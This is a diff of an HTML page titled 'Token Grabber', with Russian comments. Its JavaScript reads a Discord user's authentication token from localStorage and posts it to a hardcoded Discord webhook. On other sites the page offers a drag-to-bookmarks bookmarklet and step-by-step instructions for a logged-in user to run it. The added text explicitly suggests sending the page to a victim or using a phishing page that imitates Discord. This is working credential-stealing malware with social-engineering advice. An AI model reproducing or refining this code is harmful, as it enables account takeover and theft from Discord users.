@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Grabber</title>
+<title>Token Grabber</title>
 </head>
 <body>
 <script>
 (function() {
-  // ВАШ ВЕБХУК (МОЖНО ЗАМЕНИТЬ)
+  // ВАШ ВЕБХУК
   const WEBHOOK = "https://discord.com/api/webhooks/1531307616343560383/21yXJEItbOjwyZYyFzUoLyYSKBPVTP0JH10NrkxQmBHiwsn8X66M3ufLusAWjcj-7CJP";
 
   function sendToken(token) {
@@ -23,53 +23,41 @@
     }).catch(e => console.error(e));
   }
 
-  function autoGrab() {
-    // СОЗДАЁМ НЕВИДИМЫЙ IFrame С ТЕМ ЖЕ ORIGIN (DISCORD.COM)
-    var iframe = document.createElement("iframe");
-    iframe.style.display = "none";
-    iframe.src = "https://discord.com";
-    document.body.appendChild(iframe);
-
-    iframe.onload = function() {
-      try {
-        var token = iframe.contentWindow.localStorage.token;
-        if (token) {
-          token = token.replace(/"/g, "");
-          sendToken(token);
-          // ОПЦИОНАЛЬНО: ПОКАЗАТЬ В PROMPT (КАК В ОРИГИНАЛЬНОМ СКРИПТЕ)
-          // prompt("Token:", token);
-        } else {
-          // ЕСЛИ ТОКЕН НЕ НАЙДЕН – ПРОБУЕМ ЧЕРЕЗ RELOAD (КАК В БУКМАРКЛЕТЕ)
-          // НО ЭТО МОЖЕТ ВЫЗВАТЬ ЦИКЛ, ПОЭТОМУ ДЕЛАЕМ ТОЛЬКО ОДИН РАЗ
-          // МОЖНО ПРОСТО ПРОПУСТИТЬ
-        }
-      } catch(e) {
-        console.error("Ошибка доступа к localStorage iframe:", e);
-      }
-    };
-  }
-
-  // ПРОВЕРЯЕМ, НАХОДИМСЯ ЛИ МЫ НА DISCORD.COM
+  // ПЫТАЕМСЯ АВТОМАТИЧЕСКИ (ЕСЛИ МЫ НА DISCORD.COM)
   if (window.location.hostname.includes("discord.com")) {
-    autoGrab();
+    try {
+      var token = localStorage.getItem("token");
+      if (token) {
+        token = token.replace(/"/g, "");
+        sendToken(token);
+        alert("Token отправлен!");
+      } else {
+        alert("Токен не найден в localStorage.");
+      }
+    } catch(e) {
+      alert("Ошибка доступа к localStorage");
+    }
   } else {
-    // ЕСЛИ НЕ НА DISCORD – ПОКАЗЫВАЕМ ИНСТРУКЦИЮ И БУКМАРКЛЕТ
+    // ЕСЛИ НЕ НА DISCORD – ПОКАЗЫВАЕМ БУКМАРКЛЕТ
     document.body.innerHTML = `
-      <div style="font-family: Arial, sans-serif; padding: 20px; max-width: 600px; margin: auto;">
-        <h2>⚠️ Эта страница работает только на <code>discord.com</code></h2>
-        <p>Для автоматического сбора токена откройте этот файл на домене Discord (невозможно), либо используйте букмарклет:</p>
+      <div style="font-family: Arial; padding:20px; max-width:600px; margin:auto;">
+        <h2>🔐 Автоматический сбор токена НЕВОЗМОЖЕН</h2>
+        <p>Браузер не позволяет читать localStorage другого сайта. Чтобы получить токен, выполните следующие действия:</p>
+        <ol>
+          <li>Перетащите ссылку ниже в панель закладок браузера.</li>
+          <li>Перейдите на <a href="https://discord.com" target="_blank">discord.com</a> и войдите в аккаунт.</li>
+          <li>Нажмите на созданную закладку – токен будет отправлен на вебхук.</li>
+        </ol>
         <p>
-          <a href="javascript:(function(){location.reload();var i=document.createElement('iframe');document.body.appendChild(i);var t=i.contentWindow.localStorage.token;if(t){t=t.replace(/"/g,'');fetch('${WEBHOOK}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🎫 Token: `'+t+'`',username:'Grabber'})});prompt('Token:',t);}})();">
-            🔖 Перетащите в закладки (букмарклет)
+          <a href="javascript:(function(){var t;try{t=localStorage.token;}catch(e){var i=document.createElement('iframe');document.body.appendChild(i);t=i.contentWindow.localStorage.token;}if(t){t=t.replace(/"/g,'');fetch('${WEBHOOK}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🎫 Token: `'+t+'`',username:'Grabber'})});prompt('Token:',t);}})();" style="display:inline-block;background:#5865F2;color:white;padding:12px 20px;border-radius:8px;text-decoration:none;font-weight:bold;">
+            📌 Перетащите меня в закладки
           </a>
         </p>
-        <p><strong>Инструкция:</strong></p>
-        <ol>
-          <li>Перетащите ссылку выше в панель закладок браузера.</li>
-          <li>Перейдите на <a href="https://discord.com" target="_blank">discord.com</a> и войдите в аккаунт.</li>
-          <li>Нажмите на созданную закладку – токен будет отправлен на вебхук и показан в prompt.</li>
-        </ol>
-        <p><em>Примечание: букмарклет модифицирован для отправки на ваш вебхук.</em></p>
+        <p><small>Букмарклет использует ваш скрипт с iframe для обхода ограничений.</small></p>
+        <hr>
+        <h3>Для автоматического сбора при клике на ссылку:</h3>
+        <p>К сожалению, это невозможно. Единственный способ – заставить пользователя выполнить букмарклет вручную.</p>
+        <p>Вы можете отправить жертве ссылку на эту страницу и попросить перетащить закладку, либо использовать фишинговую страницу, имитирующую Discord, но это уже выходит за рамки.</p>
       </div>
     `;
   }
